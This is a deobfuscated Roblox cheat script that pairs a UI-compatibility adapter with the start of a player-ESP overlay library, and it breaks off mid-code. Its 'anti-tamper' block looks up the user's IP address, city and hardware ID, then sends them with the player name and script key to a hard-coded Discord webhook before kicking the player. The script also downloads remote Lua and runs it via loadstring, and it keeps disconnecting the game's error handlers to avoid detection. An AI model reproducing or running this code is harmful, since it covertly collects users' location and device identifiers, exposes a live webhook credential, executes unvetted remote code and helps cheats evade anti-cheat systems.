-- Deobfuscated by angelofthenorth.
-- Detected obfuscation: Luraph v15.
--
-- The Courage UI library is hosted separately and fetched over HttpGet;
-- this file contains only the Veil script and its UI-compatibility adapter.

-- =================================================================
-- Anti-tamper guard + webhook logger (Drowned method)
-- Snapshots __namecall at load, wraps hookmetamethod, and polls for
-- swaps. On detection: Discord webhook notification + kick.
-- Ported from main (3).lua L5-L198 (itself from anti tamp (1).lua).
-- Deterrence inside the user's own executor, not server-side security.
-- =================================================================
do
	local Players_AT = game:GetService("Players")
	local HttpService_AT = game:GetService("HttpService")
	local WEBHOOK_URL_AT = "https://discord.com/api/webhooks/1553199808167018626/-ZlN-I1nrZAFNJtvxl5soBsSiwIb7jRi9_uExATiCk6H3EemUem0i0sY-oiyL_fyn_84"
	local KICK_MESSAGE_AT = "Unauthorized script modification detected."

	local function kick_AT()
		pcall(function()
			local lp = Players_AT.LocalPlayer

			if lp then
				lp:Kick(KICK_MESSAGE_AT)
			end
		end)
	end

	local function sendDiscordNotification_AT(detectionInfo)
		local player = Players_AT.LocalPlayer

		if not player then
			return
		end

		local executor = (type(identifyexecutor) == "function" and identifyexecutor()) or "Unknown Executor"
		local scriptKey = script_key or "Unknown Script Key"
		local ip = "Unknown IP"
		local region = "Unknown Region"
		local hwid = "Unknown HWID"

		pcall(function()
			if type(gethwid) == "function" then
				hwid = tostring(gethwid())
			elseif type(getHWID) == "function" then
				hwid = tostring(getHWID())
			end
		end)

		pcall(function()
			local requestFunc = (syn and syn.request) or http_request or request or (http and http.request)

			if requestFunc then
				local resolved = false

				pcall(function()
					local response = requestFunc({
						Url = "http://ip-api.com/json?fields=query,city,regionName,country",
						Method = "GET",
					})

					if response and response.Body then
						local data = HttpService_AT:JSONDecode(response.Body)

						if data and data.query and data.query ~= "" then
							ip = tostring(data.query)
							region = tostring(data.city or "")
								.. ", "
								.. tostring(data.regionName or "")
								.. ", "
								.. tostring(data.country or "")
							resolved = true
						end
					end
				end)

				if not resolved then
					pcall(function()
						local response = requestFunc({ Url = "https://api.ipify.org/", Method = "GET" })

						if response and response.Body then
							ip = tostring(response.Body)
						end
					end)

					pcall(function()
						local response = requestFunc({ Url = "https://ipwho.is/", Method = "GET" })

						if response and response.Body then
							local data = HttpService_AT:JSONDecode(response.Body)

							if data and data.success then
								region = tostring(data.city or "")
									.. ", "
									.. tostring(data.region or "")
									.. ", "
									.. tostring(data.country or "")
							end
						end
					end)
				end
			end
		end)

		local embed = {
			title = "Anti hook tampering",
			description = "Unauthorized hook or metamethod change detected.",
			color = 15158332,
			fields = {
				{ name = "Player", value = player.Name .. " (ID: " .. player.UserId .. ")", inline = true },
				{ name = "Detection", value = tostring(detectionInfo), inline = false },
				{ name = "Script key", value = tostring(scriptKey), inline = true },
				{ name = "Executor", value = tostring(executor), inline = false },
				{ name = "IP", value = ip, inline = true },
				{ name = "HWID", value = hwid, inline = true },
				{ name = "Region", value = region, inline = false },
			},
			footer = { text = "Drowned Hub Anti Spy System" },
		}

		pcall(function()
			local requestFunc = (syn and syn.request) or http_request or request or (http and http.request)

			if requestFunc then
				requestFunc({
					Url = WEBHOOK_URL_AT,
					Method = "POST",
					Headers = { ["Content-Type"] = "application/json" },
					Body = HttpService_AT:JSONEncode({ embeds = { embed } }),
				})
			end
		end)
	end

	-- Fire exactly once: one webhook + one kick, no loop flooding.
	local function respond_AT(detectionInfo)
		if getgenv().__DROWNED_KICKED then
			return
		end

		getgenv().__DROWNED_KICKED = true
		sendDiscordNotification_AT(detectionInfo)
		kick_AT()
	end

	task.spawn(pcall, function()
		if getgenv().LoaddedThing then
			return
		end

		if
			type(hookmetamethod) ~= "function"
			or type(getrawmetatable) ~= "function"
			or type(hookfunction) ~= "function"
		then
			return
		end

		local mt = getrawmetatable(game)
		local call = mt.__namecall

		if call == nil then
			return
		end

		-- wrap hookmetamethod itself: remote-spy tools hook the real
		-- dispatch layer, which getrawmetatable never exposes, so the poll
		-- loop below cannot see them. Any game __namecall/__index install
		-- by a third party is a hit.
		if not getgenv().__DROWNED_HMMWRAPPED then
			getgenv().__DROWNED_HMMWRAPPED = true

			pcall(function()
				local pristine

				pristine = hookfunction(hookmetamethod, function(target, method, replacement, ...)
					if target == game and (method == "__namecall" or method == "__index") then
						getgenv().__DROWNED_HIT = (getgenv().__DROWNED_HIT or 0) + 1

						if not getgenv().__CH_SELFINSTALL then
							respond_AT("hookmetamethod " .. tostring(method) .. " install")
						end
					end

					return pristine(target, method, replacement, ...)
				end)

				if type(pristine) ~= "function" then
					error("hookfunction did not return the old body")
				end
			end)
		end

		getgenv().LoaddedThing = true

		while true and task.wait(0.05) do
			local mt2 = getrawmetatable(game)

			if mt2.__namecall ~= call then
				getgenv().__DROWNED_HIT = (getgenv().__DROWNED_HIT or 0) + 1
				respond_AT("__namecall swapped (poll detection)")
				return
			end
		end
	end)
end

local COURAGE_UI_URL = "https://raw.githubusercontent.com/Fahdhg/courage-ui/main/CourageUI.lua"

local function __LoadCourageUI()
	-- a local CourageUI.lua copy wins if present (offline use / testing)
	if readfile and isfile and isfile("CourageUI.lua") then
		local okLocal, resultLocal = pcall(function()
			return loadstring(readfile("CourageUI.lua"))()
		end)

		if
			okLocal
			and type(resultLocal) == "table"
			and type(resultLocal.Native) == "table"
			and type(resultLocal.Native.CreateWindow) == "function"
		then
			return resultLocal.Native
		end
	end

	local lastError

	for attempt = 1, 3 do
		local ok, result = pcall(function()
			return loadstring(game:HttpGet(COURAGE_UI_URL))()
		end)

		if
			ok
			and type(result) == "table"
			and type(result.Native) == "table"
			and type(result.Native.CreateWindow) == "function"
		then
			return result.Native
		end

		lastError = ok and "hosted file did not expose the native Courage library" or result
		task.wait(attempt)
	end

	error("[TheVeil] could not load the Courage UI library: " .. tostring(lastError), 0)
end


-- Compatibility layer: the Linoria-style API this script was written for
-- on top of the Courage UI library fetched over HttpGet above.
local function CourageCompat(Library)
	local Compat = setmetatable({}, { __index = Library })
	Compat.Options = Library.Options
	Compat.Flags = Library.Options
	Compat.Toggles = Library.Options

	local AllTabs = {}

	local function title(config, fallback)
		return config.Text or config.Title or fallback
	end

	local Groupbox = {}
	Groupbox.__index = Groupbox

	-- toggle:AddKeybind({ Default, Mode }): the old keybind flipped the toggle
	function Groupbox._patchToggle(toggle, id)
		local addKeybind = toggle.AddKeybind
		toggle.AddKeybind = function(self, idOrConfig, config)
			if type(idOrConfig) == "table" then
				config, idOrConfig = idOrConfig, id .. "_Keybind"
			end
			config = table.clone(config or {})
			-- Courage matches input.KeyCode.Name against a key name string
			if typeof(config.Default) == "EnumItem" then
				config.Default = config.Default.Name
			end
			if config.SyncState == nil then
				config.SyncState = true
			end
			return addKeybind(self, idOrConfig, config)
		end
		return toggle
	end

	function Groupbox:AddToggle(id, config)
		local toggle = self.Section:AddToggle(id, {
			Title = title(config, id),
			Description = config.Description,
			Default = config.Default or false,
			Callback = config.Callback,
		})
		-- Courage fires callbacks only on change: a toggle that starts on (Anti AFK)
		-- gets its callback once, after the script has built the UI
		if config.Default == true and type(config.Callback) == "function" then
			task.defer(function()
				if toggle.Value == true then
					pcall(config.Callback, true)
				end
			end)
		end
		return Groupbox._patchToggle(toggle, id)
	end

	function Groupbox:AddSlider(id, config)
		return self.Section:AddSlider(id, {
			Title = title(config, id),
			Description = config.Description,
			Default = config.Default,
			Min = config.Min,
			Max = config.Max,
			Rounding = config.Rounding,
			Suffix = config.Suffix,
			Callback = config.Callback,
		})
	end

	function Groupbox:AddDropdown(id, config)
		return self.Section:AddDropdown(id, {
			Title = title(config, id),
			Description = config.Description,
			Values = config.Values or {},
			Default = config.Default,
			Multi = config.Multi or false,
			AllowNull = config.AllowNull,
			Callback = config.Callback,
		})
	end

	function Groupbox:AddButton(config, extra)
		if type(config) == "string" then
			config = { Text = config, Func = extra }
		end
		return self.Section:AddButton({
			Title = title(config, "Button"),
			Description = config.Description,
			Callback = config.Func or config.Callback,
		})
	end

	function Groupbox:AddInput(id, config)
		return self.Section:AddInput(id, {
			Title = title(config, id),
			Description = config.Description,
			Default = config.Default,
			Placeholder = config.Placeholder,
			Numeric = config.Numeric,
			Finished = config.Finished,
			Callback = config.Callback,
		})
	end

	function Groupbox:AddColorPicker(id, config)
		return self.Section:AddColorpicker(id, {
			Title = title(config, id),
			Description = config.Description,
			Default = config.Default,
			Callback = config.Callback,
		})
	end

	function Groupbox:AddLabel(text)
		if type(text) == "table" then
			text = title(text, "")
		end
		return self.Section:AddText({ Title = tostring(text) })
	end

	-- The Courage section exposes no divider primitive, but the original hub calls
	-- v23:AddDivider() at L36743. Without this method that call raised
	-- attempt to call a nil value and aborted the entire build, so nothing after
	-- Insta Kill registered - Mob ESP, Combat, Trinket Farm, Rarity/Boss/Player
	-- Farm, Network, TP NPCs/Areas, Attach - and Window:Init() at L40502 never
	-- ran, which is why those tabs rendered empty.
	function Groupbox:AddDivider()
		return self
	end

	local Tab = {}
	Tab.__index = Tab

	function Tab:AddGroupbox(name)
		return setmetatable({ Section = self.Tab:AddSection({ Title = name }) }, Groupbox)
	end

	function Tab:Select()
		for _, other in ipairs(AllTabs) do
			pcall(function()
				other.Selected:set(false)
			end)
		end
		pcall(function()
			self.Tab.Selected:set(true)
		end)
	end

	local function wrapTab(tab)
		table.insert(AllTabs, tab)
		return setmetatable({ Tab = tab }, Tab)
	end

	local Category = {}
	Category.__index = Category

	function Category:AddTab(name)
		return wrapTab(self.Category:AddTab({ Title = name }))
	end

	local Window = {}
	Window.__index = Window

	function Window:AddCategory(name)
		return setmetatable({ Category = self.Window:AddCategory({ Title = name }) }, Category)
	end

	function Window:Unload()
		Library:Destroy()
	end

	function Compat:CreateWindow(config)
		local window = Library:CreateWindow({
			Title = config.Title or "Window",
			Tag = config.Version or config.Tag or "v1",
			Size = config.Size or UDim2.fromOffset(780, 540),
			MinimizeKey = config.MinimizeKey,
			Theme = config.Theme,
		})
		self.Window = window
		return setmetatable({ Window = window, Unload = Window.Unload }, Window)
	end

	function Compat:Notify(config)
		return Library:Notify({
			Title = config.Title,
			Description = config.Description or config.Content or config.Text,
			Duration = config.Duration or config.Time,
			Type = config.Type,
		})
	end

	-- the old settings tab: interface theme + Courage's own config manager
	function Compat:CreateSettingsTab(window)
		local tab = window.Window:AddCategory({ Title = "SETTINGS" }):AddTab({ Title = "Settings" })
		table.insert(AllTabs, tab)
		local ok, themes = pcall(function()
			return Library:GetThemes()
		end)
		if ok and type(themes) == "table" and #themes > 0 then
			tab:AddSection({ Title = "INTERFACE" }):AddDropdown("InterfaceTheme", {
				Title = "Theme",
				Values = themes,
				Default = (table.find(themes, "obsidian") and "obsidian") or themes[1],
				Callback = function(theme)
					pcall(function()
						Library:SetTheme(theme)
					end)
				end,
			})
		end
		pcall(function()
			Library.SaveManager:BuildConfigSection(tab)
		end)
		return tab
	end

	return Compat
end
local num, chEspLib, service, Players, UserInputService, currentCamera, localPlayer, getCharacter, getChild, lib
local tbl6, tbl7, fn15, fn16, fn17, tbl8, fn18, tweenSpeed2, fn19, connection
local connection2, connection3, connection4, connection5, connection6, connection7, flag10, connection8, connection9

do
	if not game:IsLoaded() then
		game.Loaded:Wait()
	end

	local localPlayer2 = game:GetService("Players").LocalPlayer

	task.spawn(function()

		while task.wait() do
			pcall(function()
				localPlayer2.GameplayPaused = false
			end)
		end
	end)

	local service2 = game:GetService("TeleportService")
	local localPlayerTeleportData = nil

	pcall(function()
		localPlayerTeleportData = service2:GetLocalPlayerTeleportData()
	end)

	local chAutoSlot = type(localPlayerTeleportData) == "table" and localPlayerTeleportData._chAutoSlot
	num = nil

	if chAutoSlot then
		num = tonumber(localPlayerTeleportData._chAutoSlot)
	end

	local service3 = game:GetService("ScriptContext")
	local localPlayer3 = game:GetService("Players").LocalPlayer

	if not localPlayer3 then
		game:GetService("Players"):GetPropertyChangedSignal("LocalPlayer"):Wait()
		localPlayer3 = game:GetService("Players").LocalPlayer
	end

	local function fn20()
		if not getconnections then
			return
		end

		pcall(function()
			for _, connection10 in ipairs(getconnections(service3.Error)) do
				pcall(function()
					if connection10.Disable then
						connection10:Disable()
					end
				end)

				pcall(function()
					if connection10.Disconnect then
						connection10:Disconnect()
					end
				end)
			end
		end)
	end

	fn20()

	localPlayer3.CharacterAdded:Connect(function()
		task.wait(0.5)
		fn20()
	end)

	task.spawn(function()
		while task.wait(1) do
			fn20()
		end
	end)

	if getgenv()._CH_EspLib and getgenv()._CH_EspLib.Unload then
		pcall(getgenv()._CH_EspLib.Unload, getgenv()._CH_EspLib)
	end

	local obj = setmetatable({}, { __index = function(arg, serviceName)
		return game:GetService(serviceName)
	end })

	local players = obj.Players
	local runService = obj.RunService
	local httpService = obj.HttpService
	local localPlayer4 = players.LocalPlayer
	local currentCamera2 = obj.Workspace.CurrentCamera
	local worldToViewportPoint = currentCamera2.WorldToViewportPoint
	local findFirstChildOfClass = game.FindFirstChildOfClass
	local findFirstChild = game.FindFirstChild
	local vector2, udim2, udim22, numberSequence, new2, clear

	do
		local vector = Vector3.new
		vector2 = Vector2.new
		local udim = UDim.new
		udim2 = UDim2.new
		udim22 = UDim2.fromOffset
		numberSequence = NumberSequence.new
		new2 = NumberSequenceKeypoint.new
		local format = string.format
		clear = table.clear
		local floor = math.floor
		local clamp = math.clamp
		local abs = math.abs
		local tan = math.tan
		local rad = math.rad
		local remove = table.remove
		local n9 = 0.016666666666666666
		local v24 = vector(0, 0, 0)
		local position = vector(0, 0, 0)
		local n10 = 0
		local y = 0
		local now3 = 0

		local function fn21()
			y = currentCamera2.ViewportSize.Y
			n10 = y / (2 * tan(rad(currentCamera2.FieldOfView) * 0.5))
		end

		fn21()
		currentCamera2:GetPropertyChangedSignal("FieldOfView"):Connect(fn21)
		currentCamera2:GetPropertyChangedSignal("ViewportSize"):Connect(fn21)

		local index = {
			Directory = "Esp",
			["Cache"] = {},
			Holder = nil,
			Threads = {},
			Connections = {},
			Table = {
				Enabled = false,
				ShowLocalPlayer = false,
				["Distance"] = 7520,
				RefreshRate = 60,
				Font = "TahomaBold",
				FontSize = 12,
				["FontType"] = "none",
				Boxes = {
					["Enabled"] = true,
					["Type"] = "2D",
					Rotation = 90,
					["Box Glow"] = {
						Enabled = true,
						Top = Color3.fromRGB(255, 255, 255),
						Bot = Color3.fromRGB(255, 255, 255),
						Transparency = { 0.75, 0.75 },
					},
					["Gradients"] = {
						["Top"] = Color3.fromRGB(255, 255, 255),
						Bot = Color3.fromRGB(255, 255, 255),
					},
					Filled = {
						Enabled = false,
						Top = Color3.fromRGB(255, 255, 255),
						Bot = Color3.fromRGB(255, 255, 255),
						Transparency = { 1, 0.65 },
					},
				},
				Bars = {
					["Health Bar"] = {
						Enabled = true,
						Top = Color3.fromRGB(0, 255, 0),
						["Mid"] = Color3.fromRGB(255, 170, 0),
						Bot = Color3.fromRGB(255, 0, 0),
					},
					["Armor Bar"] = {
						Enabled = false,
						["Top"] = Color3.fromRGB(255, 255, 255),
						Mid = Color3.fromRGB(220, 220, 220),
						Bot = Color3.fromRGB(180, 180, 180),
					},
				},
				["Texts"] = {
					Name = { Enabled = true, Color = Color3.fromRGB(255, 255, 255) },
					Distance = { ["Enabled"] = true, Color = Color3.fromRGB(255, 255, 255) },
					Weapon = { Enabled = true, ["Color"] = Color3.fromRGB(255, 255, 255) },
				},
				["Flags"] = {
					["Walking"] = {
						Enabled = false,
						Color = Color3.fromRGB(255, 0, 0),
						Text = "Walking",
					},
					["Jumping"] = {
						Enabled = false,
						Color = Color3.fromRGB(144, 238, 144),
						["Text"] = "Jumping",
					},
					Swimming = { Enabled = false, Color = Color3.fromRGB(0, 255, 255), Text = "Swimming" },
				},
				["Chams"] = {
					Enabled = false,
					["FillTransparency"] = 0,
					["FillColor"] = Color3.fromRGB(255, 255, 255),
					OutlineColor = Color3.fromRGB(0, 0, 0),
				},
			},
		}

		local table_ = index.Table

		local function fn22(arg, arg2, arg3, arg4)
			if not isfile(arg4.Id) then
				writefile(arg4.Id, arg4.Font)
			end

			if isfile(arg .. ".font") then
				delfile(arg .. ".font")
			end

			writefile(arg .. ".font", httpService:JSONEncode({
				name = arg,
				faces = { { name = "Normal", weight = arg2, style = arg3, assetId = getcustomasset(arg4.Id) } },
			}))

			return getcustomasset(arg .. ".font")
		end

		index.Minecraftia = Font.new(({
			Minecraftia = fn22("Minecraftia", 400, "Normal", {
				Id = "Minecraftia-Regular.ttf",
				Font = game:HttpGet("https://raw.githubusercontent.com/i77lhm/storage/main/fonts/Minecraftia-Regular.ttf"),
			}),
		}).Minecraftia, Enum.FontWeight.Regular, Enum.FontStyle.Normal)

		index.__index = index
		getgenv()._CH_EspLib = index

		index.CreateObjects = function(arg, arg2, arg3)
			local instance = Instance.new(arg2)
			local tbl10 = arg3 or {}

			for k, v25 in tbl10 do
				instance[k] = v25
			end

			return instance
		end

		index.CreateThreads = function(arg, arg2, signal, arg3)
			local connection10 = signal:Connect(arg3)
			arg.Threads[arg2] = connection10
			do
				return connection10
			end

			while true do
			end
		end

		index.Holder = index:CreateObjects("ScreenGui", {
			Name = "\n",
			Parent = gethui(),
			ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets,
			ZIndexBehavior = Enum.ZIndexBehavior.Global,
			ResetOnSpawn = false,
			DisplayOrder = 10000,
			IgnoreGuiInset = true,
		})

		index.InitEsp = function(arg, arg2)
			local objects = arg2.Objects

			objects.TargetHolder = arg:CreateObjects("Frame", {
				Parent = arg.Holder,
				Visible = false,
				BackgroundTransparency = 1,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(0, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects.TopHolder = arg:CreateObjects("Frame", {
				Parent = objects.TargetHolder,
				AutomaticSize = Enum.AutomaticSize.Y,
				Visible = true,
				BackgroundTransparency = 1,
				AnchorPoint = vector2(0, 1),
				Position = udim2(0, -2, 0, -5),
				Size = udim2(1, 4, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects.BottomHolder = arg:CreateObjects("Frame", {
				Parent = objects.TargetHolder,
				AutomaticSize = Enum.AutomaticSize.Y,
				Visible = true,
				BackgroundTransparency = 1,
				Position = udim2(0, -2, 1, 3),
				Size = udim2(1, 4, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects.LeftHolder = arg:CreateObjects("Frame", {
				Parent = objects.TargetHolder,
				AutomaticSize = Enum.AutomaticSize.X,
				Visible = true,
				BackgroundTransparency = 1,
				AnchorPoint = vector2(1, 0),
				Position = udim2(0, -5, 0, -2),
				Size = udim2(0, 0, 1, 4),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects.RightHolder = arg:CreateObjects("Frame", {
				Parent = objects.TargetHolder,
				AutomaticSize = Enum.AutomaticSize.X,
				Visible = true,
				BackgroundTransparency = 1,
				Position = udim2(1, 5, 0, -2),
				Size = udim2(0, 0, 1, 4),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects["TopTextHolder"] = arg:CreateObjects("Frame", {
				Parent = objects.TopHolder,
				AutomaticSize = Enum.AutomaticSize.Y,
				Visible = true,
				BackgroundTransparency = 1,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(1, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects.BottomTextHolder = arg:CreateObjects("Frame", {
				Parent = objects.BottomHolder,
				LayoutOrder = 2,
				AutomaticSize = Enum.AutomaticSize.Y,
				Visible = true,
				BackgroundTransparency = 1,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(1, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects["LeftTextHolder"] = arg:CreateObjects("Frame", {
				Parent = objects["LeftHolder"],
				AutomaticSize = Enum.AutomaticSize.XY,
				Visible = true,
				BackgroundTransparency = 1,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(1, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects.RightTextHolder = arg:CreateObjects("Frame", {
				Parent = objects.RightHolder,
				LayoutOrder = 2,
				AutomaticSize = Enum.AutomaticSize.XY,
				Visible = true,
				BackgroundTransparency = 1,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(0, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects.LeftBarHolder = arg:CreateObjects("Frame", {
				Parent = objects.LeftHolder,
				AutomaticSize = Enum.AutomaticSize.X,
				Visible = false,
				BackgroundTransparency = 1,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(0, 0, 1, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects["BottomBarHolder"] = arg:CreateObjects("Frame", {
				Parent = objects.BottomHolder,
				LayoutOrder = 0,
				AutomaticSize = Enum.AutomaticSize.Y,
				Visible = false,
				BackgroundTransparency = 1,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(1, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			arg:CreateObjects("UIListLayout", {
				Parent = objects.TopTextHolder,
				VerticalAlignment = Enum.VerticalAlignment.Bottom,
				HorizontalAlignment = Enum.HorizontalAlignment.Center,
				Padding = udim(0, 1),
				SortOrder = Enum.SortOrder.LayoutOrder,
			})

			arg:CreateObjects("UIListLayout", {
				Parent = objects.BottomTextHolder,
				HorizontalAlignment = Enum.HorizontalAlignment.Center,
				Padding = udim(0, -1),
				SortOrder = Enum.SortOrder.LayoutOrder,
			})

			arg:CreateObjects("UIListLayout", {
				Parent = objects["LeftTextHolder"],
				HorizontalAlignment = Enum.HorizontalAlignment.Right,
				Padding = udim(0, 0),
				SortOrder = Enum.SortOrder.LayoutOrder,
			})

			arg:CreateObjects("UIListLayout", {
				Parent = objects["RightTextHolder"],
				HorizontalAlignment = Enum.HorizontalAlignment.Left,
				Padding = udim(0, 0),
				SortOrder = Enum.SortOrder.LayoutOrder,
			})

			arg:CreateObjects("UIListLayout", {
				Parent = objects["LeftBarHolder"],
				FillDirection = Enum.FillDirection.Horizontal,
				HorizontalAlignment = Enum.HorizontalAlignment.Right,
				Padding = udim(0, 5),
				SortOrder = Enum.SortOrder.LayoutOrder,
			})

			arg:CreateObjects("UIListLayout", {
				Parent = objects.BottomBarHolder,
				HorizontalAlignment = Enum.HorizontalAlignment.Center,
				Padding = udim(0, 5),
				SortOrder = Enum.SortOrder.LayoutOrder,
			})

			arg:CreateObjects("UIListLayout", {
				Parent = objects.TopHolder,
				VerticalAlignment = Enum.VerticalAlignment.Bottom,
				Padding = udim(0, 1),
				SortOrder = Enum.SortOrder.LayoutOrder,
			})

			arg:CreateObjects("UIListLayout", { Parent = objects.BottomHolder, Padding = udim(0, 1), SortOrder = Enum.SortOrder.LayoutOrder })

			arg:CreateObjects("UIListLayout", {
				Parent = objects["LeftHolder"],
				FillDirection = Enum.FillDirection.Horizontal,
				HorizontalAlignment = Enum.HorizontalAlignment.Left,
				Padding = udim(0, 1),
				SortOrder = Enum.SortOrder.LayoutOrder,
			})

			arg:CreateObjects("UIListLayout", {
				Parent = objects.RightHolder,
				FillDirection = Enum.FillDirection.Horizontal,
				HorizontalAlignment = Enum.HorizontalAlignment.Left,
				Padding = udim(0, 1),
				SortOrder = Enum.SortOrder.LayoutOrder,
			})

			arg:CreateObjects("UIPadding", { Parent = objects.TopTextHolder, PaddingBottom = udim(0, 0) })
			arg:CreateObjects("UIPadding", { Parent = objects.BottomTextHolder, PaddingTop = udim(0, -1) })
			arg:CreateObjects("UIPadding", { Parent = objects["LeftTextHolder"], PaddingTop = udim(0, -3) })
			arg:CreateObjects("UIPadding", { Parent = objects.RightTextHolder, PaddingTop = udim(0, -3) })
			arg:CreateObjects("UIPadding", { Parent = objects.LeftBarHolder, PaddingRight = udim(0, 0) })
			arg:CreateObjects("UIPadding", { Parent = objects.BottomBarHolder, PaddingTop = udim(0, 2) })
			arg:CreateObjects("UIPadding", { Parent = objects.LeftHolder, PaddingRight = udim(0, 1) })

			objects["BoxGlow"] = arg:CreateObjects("ImageLabel", {
				Parent = objects["TargetHolder"],
				Image = "rbxassetid://110204605000367",
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(vector2(21, 21), vector2(79, 79)),
				AutomaticSize = Enum.AutomaticSize.XY,
				ImageTransparency = 0.65,
				ResampleMode = Enum.ResamplerMode.Pixelated,
				Visible = true,
				BackgroundTransparency = 1,
				Position = udim2(0, -21, 0, -21),
				Size = udim2(0, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			local new = ColorSequenceKeypoint.new
			local color = Color3.fromRGB
			local v25 = 1

			objects["BoxGlowGradient"] = arg:CreateObjects("UIGradient", {
				Parent = objects["BoxGlow"],
				Rotation = 90,
				Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)), new(1, color(0, 0, 0)) }),
				Transparency = numberSequence({ new2(0, 0), new2(v25, 0) }),
			})

			arg:CreateObjects("UIPadding", {
				Parent = objects["BoxGlow"],
				PaddingTop = udim(0, 21),
				PaddingBottom = udim(0, 20),
				PaddingLeft = udim(0, 21),
				PaddingRight = udim(0, 20),
			})

			objects.BoxOutlineHolder = arg:CreateObjects("Frame", {
				Parent = objects.BoxGlow,
				Visible = false,
				BackgroundTransparency = 1,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(0, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects.BoxOutline = arg:CreateObjects("UIStroke", { Parent = objects["BoxOutlineHolder"], Thickness = 3, LineJoinMode = Enum.LineJoinMode.Miter })
			local new3 = ColorSequenceKeypoint.new
			local v26 = 1
			local color2 = Color3.fromRGB
			local v27 = 1

			objects["BoxOutlineGradient"] = arg:CreateObjects("UIGradient", {
				Parent = objects.BoxOutline,
				Rotation = 90,
				Color = ColorSequence.new({
					ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
					new3(v26, color2(0, 0, 0)),
				}),
				Transparency = numberSequence({ new2(0, 0), new2(v27, 0) }),
			})

			objects.BoxInlineHolder = arg:CreateObjects("Frame", {
				Parent = objects.BoxGlow,
				Visible = false,
				BackgroundTransparency = 1,
				Position = udim2(0, -1, 0, -1),
				Size = udim2(0, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects.BoxInline = arg:CreateObjects("UIStroke", {
				Parent = objects.BoxInlineHolder,
				Color = Color3.fromRGB(255, 255, 255),
				LineJoinMode = Enum.LineJoinMode.Miter,
			})

			local new4 = ColorSequenceKeypoint.new
			local color3 = Color3.fromRGB
			local v28 = 255

			objects["BoxInlineGradient"] = arg:CreateObjects("UIGradient", {
				Parent = objects["BoxInline"],
				Rotation = 90,
				Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)), new4(1, color3(255, v28, 255)) }),
				Transparency = numberSequence({ new2(0, 0), new2(1, 0) }),
			})

			objects.BoxFill = arg:CreateObjects("Frame", {
				Parent = objects.BoxGlow,
				Visible = false,
				BackgroundTransparency = 0,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(0, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			local new5 = ColorSequenceKeypoint.new
			local color4 = Color3.fromRGB
			local v29 = 255

			objects.BoxFillGradient = arg:CreateObjects("UIGradient", {
				Parent = objects.BoxFill,
				Rotation = 90,
				Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)), new5(1, color4(v29, 255, 255)) }),
				Transparency = numberSequence({ new2(0, 1), new2(1, 1) }),
			})

			objects.CornerHolder = arg:CreateObjects("Frame", {
				Parent = objects.BoxGlow,
				Visible = false,
				BackgroundTransparency = 1,
				Position = udim2(0, -1, 0, -1),
				Size = udim2(0, 0, 0, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			for i = 1, 8 do
				objects["Line_" .. i] = arg:CreateObjects("Frame", {
					Parent = objects.CornerHolder,
					Visible = false,
					BackgroundTransparency = 0,
					Position = udim2(0, 0, 0, 0),
					Size = udim2(0, 0, 0, 0),
					BorderSizePixel = 0,
					BorderColor3 = Color3.fromRGB(0, 0, 0),
					BackgroundColor3 = Color3.fromRGB(255, 255, 255),
				})

